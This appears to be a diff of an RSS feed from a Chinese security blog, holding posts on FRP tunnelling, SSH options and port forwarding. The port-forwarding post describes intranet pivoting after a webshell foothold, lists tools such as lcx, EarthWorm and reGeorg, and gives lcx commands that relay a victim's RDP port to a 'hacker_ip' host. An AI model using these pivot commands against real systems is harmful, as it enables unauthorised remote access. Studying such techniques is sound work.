@@ -1,33 +1,122 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>端口转发 on Reber&#39;s Blog</title>
-    <link>https://wyb0.com/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</link>
-    <description>Recent content in 端口转发 on Reber&#39;s Blog</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Tue, 30 Jul 2019 23:27:54 +0000</lastBuildDate>
-    <atom:link href="https://wyb0.com/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>FRP 内网穿透</title>
-      <link>https://wyb0.com/posts/2019/frp-intranet-through/</link>
-      <pubDate>Tue, 30 Jul 2019 23:27:54 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2019/frp-intranet-through/</guid>
-      <description>0x00 对外提供简单的文件访问服务 服务端 ➜ frp cat frps.ini [common] ; 监听端口 bind_port = 7000 ; 那些端口允许客户端用来映射 allow_ports = 22-80,3000,33389 ➜ frp ./frps -c frps.ini 2019/07/31 00:22:31 [I] [service.go:139] frps tcp listen on</description>
-    </item>
-    <item>
-      <title>SSH 免密登录及 SSH 隧道</title>
-      <link>https://wyb0.com/posts/2016/linux-ssh-connect/</link>
-      <pubDate>Wed, 10 Aug 2016 11:46:13 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/linux-ssh-connect/</guid>
-      <description>0x00 SSH相关选项 -V 显示版本 -f 输入密码后进入后台模式 -N 不执行远程命令，一般与-f连用，用于端口转发 -C 压缩传输的数据，网速快</description>
-    </item>
-    <item>
-      <title>端口转发</title>
-      <link>https://wyb0.com/posts/2016/port-forwarding/</link>
-      <pubDate>Mon, 08 Aug 2016 19:33:45 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/port-forwarding/</guid>
-      <description>0x00 应用场景 内网IP的80端口通过端口映射到了外网IP的80端口上 内网的Web服务器通过外网IP反向代理(如Nginx) 也</description>
-    </item>
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>端口转发 on Reber's Blog</title><link>https://wyb0.com/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</link><description>Recent content in 端口转发 on Reber's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Tue, 30 Jul 2019 23:27:54 +0000</lastBuildDate><atom:link href="https://wyb0.com/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.xml" rel="self" type="application/rss+xml"/><item><title>FRP 内网穿透</title><link>https://wyb0.com/posts/2019/frp-intranet-through/</link><pubDate>Tue, 30 Jul 2019 23:27:54 +0000</pubDate><guid>https://wyb0.com/posts/2019/frp-intranet-through/</guid><description>&lt;h3 id="0x00-对外提供简单的文件访问服务">0x00 对外提供简单的文件访问服务&lt;/h3>
+&lt;ul>
+&lt;li>服务端&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">➜ frp cat frps.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 监听端口&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bind_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 那些端口允许客户端用来映射&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">allow_ports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">22-80,3000,33389&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>➜ frp ./frps -c frps.ini
+2019/07/31 00:22:31 [I] [service.go:139] frps tcp listen on 0.0.0.0:7000
+2019/07/31 00:22:31 [I] [root.go:204] Start frps success
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>客户端&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">C:\Users\Administrator\Desktop\frp&amp;gt;type frpc.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">66.123.35.123&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[test_static_file]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">tcp&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 文件服务的端口&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remote_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">3000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 启用插件&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">static_file&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 要对外暴露的文件目录&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_local_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">C:\\Users\Administrator\Desktop\frp_file&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 访问 url 中会被去除的前缀，保留的内容即为要访问的文件路径&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_strip_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">myfile&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 301 认证&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_http_user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">admin&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_http_passwd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">123456&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>C:\Users\Administrator\Desktop\frp&amp;gt;frpc.exe -c frpc.ini
+2019/07/31 00:36:05 [I] [service.go:221] login to server success, get run id [c8
+aef41d5862b79f], server udp port [0]
+2019/07/31 00:36:05 [I] [proxy_manager.go:137] [c8aef41d5862b79f] proxy added: [
+test_static_file]
+2019/07/31 00:36:05 [I] [control.go:144] [test_static_file] start proxy success
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>访问&lt;br>
+浏览器直接访问 &lt;code>http://66.123.35.123:3000/myfile/&lt;/code> 即可访问到 frp_file 中的文件&lt;/li>
+&lt;/ul>
+&lt;h3 id="0x01-使用-frp-进行内网-3389-端口转发并加密压缩">0x01 使用 frp 进行内网 3389 端口转发并加密压缩&lt;/h3>
+&lt;ul>
+&lt;li>服务端&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">➜ frp cat frps.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bind_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">➜ frp ./frps -c frps.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">2019/07/30 23:31:31 [I] [service.go:139] frps tcp listen on 0.0.0.0:7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">2019/07/30 23:31:31 [I] [root.go:204] Start frps success&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>客户端&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">C:\Users\Administrator\Desktop\frp&amp;gt;type frpc.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">66.123.35.123&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[rdp]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">tcp&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">127.0.0.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">3389&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remote_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">33389&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 加密压缩&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">use_encryption&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">use_compression&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">true&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>C:\Users\Administrator\Desktop\frp&amp;gt;frpc.exe -c frpc.ini
+2019/07/30 23:32:38 [I] [service.go:221] login to server success, get run id [ce
+144f7511f63353], server udp port [0]
+2019/07/30 23:32:38 [I] [proxy_manager.go:137] [ce144f7511f63353] proxy added: [
+rdp]
+2019/07/30 23:32:38 [I] [control.go:144] [rdp] start proxy success
+&lt;/code>&lt;/pre>&lt;p>这里其实可以把 frp 做成服务，开机自启动的那种&lt;/p></description></item><item><title>SSH 免密登录及 SSH 隧道</title><link>https://wyb0.com/posts/2016/linux-ssh-connect/</link><pubDate>Wed, 10 Aug 2016 11:46:13 +0000</pubDate><guid>https://wyb0.com/posts/2016/linux-ssh-connect/</guid><description>&lt;h3 id="0x00-ssh相关选项">0x00 SSH相关选项&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>-V 显示版本&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>-f 输入密码后进入后台模式&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>-N 不执行远程命令，一般与-f连用，用于端口转发&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>-C 压缩传输的数据，网速快时会影响速度&lt;/p></description></item><item><title>端口转发</title><link>https://wyb0.com/posts/2016/port-forwarding/</link><pubDate>Mon, 08 Aug 2016 19:33:45 +0000</pubDate><guid>https://wyb0.com/posts/2016/port-forwarding/</guid><description>&lt;h3 id="0x00-应用场景">0x00 应用场景&lt;/h3>
+&lt;ul>
+&lt;li>内网IP的80端口通过端口映射到了外网IP的80端口上&lt;/li>
+&lt;li>内网的Web服务器通过外网IP反向代理(如Nginx)
+也就是说Web服务器在内网中&lt;/li>
+&lt;/ul>
+&lt;h3 id="0x01-判断web是否为内网">0x01 判断Web是否为内网&lt;/h3>
+&lt;ul>
+&lt;li>向ping域名，查看IP是外网&lt;/li>
+&lt;li>用webshell查看ip却是内网IP&lt;/li>
+&lt;/ul>
+&lt;h3 id="0x02-端口转发工具">0x02 端口转发工具&lt;/h3>
+&lt;ul>
+&lt;li>lcx&lt;/li>
+&lt;li>htran&lt;/li>
+&lt;li>&lt;a href="http://rootkiter.com/EarthWorm/?_blank">EarthWorm&lt;/a>&lt;/li>
+&lt;li>netsh&lt;/li>
+&lt;li>&lt;a href="https://github.com/sensepost/reGeorg?_blank">reGeorg&lt;/a>&lt;/li>
+&lt;li>meterpreter porfwd&lt;/li>
+&lt;/ul>
+&lt;h3 id="0x03-lcx端口转发">0x03 lcx端口转发&lt;/h3>
+&lt;ul>
+&lt;li>Hacker：lcx.exe -listen 500 8888&lt;/li>
+&lt;li>Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389&lt;/li>
+&lt;li>Hacker：cmd mstsc hacker_ip:500&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_hacker_run_lcx.png" alt="hacker运行lcx">
+&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_vimctim_run_lcx.png" alt="vimctim端运行lcx">
+&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_hacker_remote_conn.png" alt="hacker远程连接">
+&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_hacker_remote_conn_success.png" alt="hacker远程连接成功">&lt;/p></description></item></channel></rss>
